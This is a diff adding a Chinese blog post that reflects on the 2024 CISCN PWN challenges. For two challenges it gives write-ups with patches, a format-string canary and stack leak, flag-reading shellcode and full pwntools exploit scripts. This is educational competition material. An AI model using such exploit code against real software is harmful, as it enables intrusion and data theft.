@@ -1,0 +1,587 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="栈,shellcode,rw" />
+
+
+<link rel="canonical" href="http://example.com/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/">
+
+
+
+  <title>
+2024Ciscn国赛心得 - 感受 - PWN的学习 |
+yhuanhuan =  = 不在能知，乃在能行</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">2024Ciscn国赛心得
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-06-25 21:17:42">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-06-25T21:17:42+08:00">2024-06-25</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>3k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>3 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">yhuanhuan</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/wD8Kc2Y5Iu4mEk1.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/AZcIyhXYgxDa36f.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/pxCY3PlNUAW5GTn.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/xjtAgruqnc43m1Q.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/03/HAYmvDsoGfbIVl3.png"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/08/04/caejg5tYskU186E.png"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" itemprop="item" rel="index" title="分类于 PWN的学习"><span itemprop="name">PWN的学习</span></a>
+<meta itemprop="position" content="1" /></span>
+<i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%84%9F%E5%8F%97/" itemprop="item" rel="index" title="分类于 感受"><span itemprop="name">感受</span></a>
+<meta itemprop="position" content="2" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/huanhuan.png">
+    <meta itemprop="name" content="yhuanhuan">
+    <meta itemprop="description" content="不在能知，乃在能行, 欢迎来到Huan的笔记空间~~~~~~🌸">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="2024ciscn国赛心得"><a class="markdownIt-Anchor" href="#2024ciscn国赛心得">#</a> 2024Ciscn 国赛心得</h1>
+<blockquote>
+<p>前言</p>
+</blockquote>
+<pre><code>今年总的来说，pwn方向两道题都不是很难。虽然一道都没给做出来。还是由于经验不足导致的吧。首先第一道pwn的话，在本地是能读取到flag文件，但是远程就是不能去读取flag，线下询问了一个华东北第二名队伍的pwn师傅，才知道远程打开flag的fd并不是3，而是5，是openat的rax的值，真是学到了不少东西。第二道是将符号表全都去掉，因为第一题一直以为是栈的问题在不断调试，导致第二题光fix并没有去做。
+</code></pre>
+<h3 id="pwn_1"><a class="markdownIt-Anchor" href="#pwn_1">#</a> pwn_1</h3>
+<h5 id="fix"><a class="markdownIt-Anchor" href="#fix">#</a> fix</h5>
+<p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625180143222.png" alt="image-20240625180143222"></p>
+<p>将 0x80-&gt; 改为 0x50 即可</p>
+<h5 id="break"><a class="markdownIt-Anchor" href="#break">#</a> break</h5>
+<p>NX 关闭，栈可执行，往栈上写入 shellcode，利用格式化字符串，泄露 stack 地址，从而控制返回地址返回到 shellcode 处。</p>
+<p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625180959807.png" alt="image-20240625180959807"></p>
+<p>禁用 open、readv、writev、和 exev 系列。</p>
+<p>可以利用 openat、read、write、sendfile。</p>
+<p>可惜一直忘记用 read、write。以为是栈的问题，结果是远程的 fd 和本地的 fd 不一样导致的。</p>
+<p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625181146191.png" alt="image-20240625181146191"></p>
+<p>利用格式化字符串泄露 canary 和 stack 的地址。</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>pl <span class="token operator">=</span> <span class="token string">b'%17$p'</span></pre></td></tr><tr><td data-num="2"></td><td><pre>sla<span class="token punctuation">(</span><span class="token string">b'2: get name\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>sa<span class="token punctuation">(</span><span class="token string">b'->set name\n'</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>sla<span class="token punctuation">(</span><span class="token string">b'2: get name\n'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>ru<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>pl <span class="token operator">=</span> <span class="token string">b'%25$p'</span></pre></td></tr><tr><td data-num="10"></td><td><pre>sla<span class="token punctuation">(</span><span class="token string">b'2: get name\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>sa<span class="token punctuation">(</span><span class="token string">b'->set name\n'</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>sla<span class="token punctuation">(</span><span class="token string">b'2: get name\n'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>ru<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>stack_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x118</span> <span class="token operator">-</span> <span class="token number">0x60</span></pre></td></tr></table></figure><p>接下来 ret2shellcode 就行</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>openat<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"flag\x00"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'rax'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token comment">#fd 要是 rax 不能是 3，否则读不到远程 flag</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>pl <span class="token operator">=</span> <span class="token string">b'\x90'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>sla<span class="token punctuation">(</span><span class="token string">b'2: get name\n'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>sa<span class="token punctuation">(</span><span class="token string">b'->set name\n'</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>sla<span class="token punctuation">(</span><span class="token string">b'2: get name\n'</span><span class="token punctuation">,</span><span class="token string">b'-1'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>下面是自己写的 openat + read + write 的汇编。</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="2"></td><td><pre>	push 0x67616c66</pre></td></tr><tr><td data-num="3"></td><td><pre>	mov rsi, rsp</pre></td></tr><tr><td data-num="4"></td><td><pre>	push -0x64</pre></td></tr><tr><td data-num="5"></td><td><pre>	pop rdi</pre></td></tr><tr><td data-num="6"></td><td><pre>	xor edx, edx</pre></td></tr><tr><td data-num="7"></td><td><pre>	mov eax, 257</pre></td></tr><tr><td data-num="8"></td><td><pre>	syscall</pre></td></tr><tr><td data-num="9"></td><td><pre>	mov edi, eax</pre></td></tr><tr><td data-num="10"></td><td><pre>	mov rsi, &#123;&#125;</pre></td></tr><tr><td data-num="11"></td><td><pre>	mov edx, 0x40</pre></td></tr><tr><td data-num="12"></td><td><pre>	xor eax, eax</pre></td></tr><tr><td data-num="13"></td><td><pre>	syscall</pre></td></tr><tr><td data-num="14"></td><td><pre>	mov edi, 1</pre></td></tr><tr><td data-num="15"></td><td><pre>	mov rsi, &#123;&#125;</pre></td></tr><tr><td data-num="16"></td><td><pre>	mov edx, 0x40</pre></td></tr><tr><td data-num="17"></td><td><pre>	mov eax, 1</pre></td></tr><tr><td data-num="18"></td><td><pre>	syscall</pre></td></tr><tr><td data-num="19"></td><td><pre>'''</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>pl <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">b'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pl<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>sla<span class="token punctuation">(</span><span class="token string">b'2: get name\n'</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>dug<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>sa<span class="token punctuation">(</span><span class="token string">b'->set name\n'</span><span class="token punctuation">,</span>pl<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>sla<span class="token punctuation">(</span><span class="token string">b'2: get name\n'</span><span class="token punctuation">,</span><span class="token string">b'-1'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>it<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="pwn_2"><a class="markdownIt-Anchor" href="#pwn_2">#</a> pwn_2</h3>
+<blockquote>
+<p>不得不说，去符号表属实难看。唉，怪我忘记恢复符号表了，rizz 的恢复符号表的效果一言难尽。</p>
+</blockquote>
+<blockquote>
+<p>在这里特别感谢 eastXueLia 师傅，浇我使用 flare 恢复符号表。以前恢复符号表各种碰壁，终于有一个可以恢复符号表特别有用的方式了！</p>
+</blockquote>
+<h5 id="fix-2"><a class="markdownIt-Anchor" href="#fix-2">#</a> fix</h5>
+<p>利用 flare 恢复符号表之后</p>
+<p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625201547611.png" alt="image-20240625201547611"></p>
+<p>在这里将 /flag 名字改一下，就能防御成功。</p>
+<h5 id="break-2"><a class="markdownIt-Anchor" href="#break-2">#</a> break</h5>
+<p>add</p>
+<p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202729350.png" alt="image-20240625202729350"></p>
+<p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202747051.png" alt="image-20240625202747051"></p>
+<p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625202802852.png" alt="image-20240625202802852"></p>
+<p>分配一个空间，并向其写入 8 字节大小的数据</p>
+<p>check</p>
+<p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211015394.png" alt="image-20240625211015394"></p>
+<p>在这里会把 flag 读入一个位置。</p>
+<p>get</p>
+<p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211231319.png" alt="image-20240625211231319"></p>
+<p>这里可以完成 flag 的泄露</p>
+<p>只要找到将 flag 写入内存内，并找到，使用 get 即可找到 flag (本地测试是这样，远程应该还会出啥幺蛾子吧)</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># from ctypes import *</span></pre></td></tr><tr><td data-num="4"></td><td><pre>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># host, port = "47.103.122.127:30175".split(":")</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># r = remote(host, int(port))</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment"># r = gdb.debug('./pwn')</span></pre></td></tr><tr><td data-num="9"></td><td><pre>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2_'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment"># libc = ELF('/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')</span></pre></td></tr><tr><td data-num="12"></td><td><pre>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn2_'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span> r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data         <span class="token punctuation">:</span> r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span> r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data         <span class="token punctuation">:</span> r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span> data         <span class="token punctuation">:</span> r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span> r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>lic     <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span> uu64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>pack    <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token builtin">str</span><span class="token punctuation">,</span> addr          <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>padding <span class="token operator">=</span> <span class="token keyword">lambda</span> length             <span class="token punctuation">:</span> <span class="token string">b'Yhuan'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>length <span class="token operator">//</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'Y'</span> <span class="token operator">*</span> <span class="token punctuation">(</span>length <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>it      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span> r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>lss     <span class="token operator">=</span> <span class="token keyword">lambda</span> s                  <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%s --> 0x%x \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token triple-quoted-string string">'''</pre></td></tr><tr><td data-num="32"></td><td><pre>1: ls flag</pre></td></tr><tr><td data-num="33"></td><td><pre>2: add flag</pre></td></tr><tr><td data-num="34"></td><td><pre>3: edit flag</pre></td></tr><tr><td data-num="35"></td><td><pre>4: del flag</pre></td></tr><tr><td data-num="36"></td><td><pre>5: get flag</pre></td></tr><tr><td data-num="37"></td><td><pre>6: check flag</pre></td></tr><tr><td data-num="38"></td><td><pre>'''</span></pre></td></tr><tr><td data-num="39"></td><td><pre>ru<span class="token punctuation">(</span><span class="token string">'6: check flag\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="40"></td><td><pre>sl<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre>ru<span class="token punctuation">(</span><span class="token string">'6: check flag\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>sl<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>x <span class="token operator">=</span> <span class="token number">0x4ef784</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>flag <span class="token operator">=</span> <span class="token number">0x4efaf0</span></pre></td></tr><tr><td data-num="47"></td><td><pre>ru<span class="token punctuation">(</span><span class="token string">'6: check flag\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>sl<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="50"></td><td><pre>it<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="/img/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/image-20240625211439570.png" alt="image-20240625211439570"></p>
+<p>粘几篇 blog 吧</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTkwNjUzMy9hcnRpY2xlL2RldGFpbHMvMTM5OTM3Mjg4P2NzZG5fc2hhcmVfdGFpbD0lN0IlMjJ0eXBlJTIyJTNBJTIyYmxvZyUyMiUyQyUyMnJUeXBlJTIyJTNBJTIyYXJ0aWNsZSUyMiUyQyUyMnJJZCUyMiUzQSUyMjEzOTkzNzI4OCUyMiUyQyUyMnNvdXJjZSUyMiUzQSUyMndlaXhpbl80NTkwNjUzMyUyMiU3RA==">2024 CISCN 华东北分区赛 - Ahisec-CSDN 博客</span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0F0b21UZWFtL2FydGljbGUvZGV0YWlscy8xMzk5MzAwMDA=">2024 全国大学生信息安全竞赛（ciscn）半决赛华东北赛区 Pwn 题解 - CSDN 博客</span></p>
+
+      <div class="tags">
+          <a href="/tags/%E6%A0%88/" rel="tag"><i class="ic i-tag"></i> 栈</a>
+          <a href="/tags/shellcode/" rel="tag"><i class="ic i-tag"></i> shellcode</a>
+          <a href="/tags/rw/" rel="tag"><i class="ic i-tag"></i> rw</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
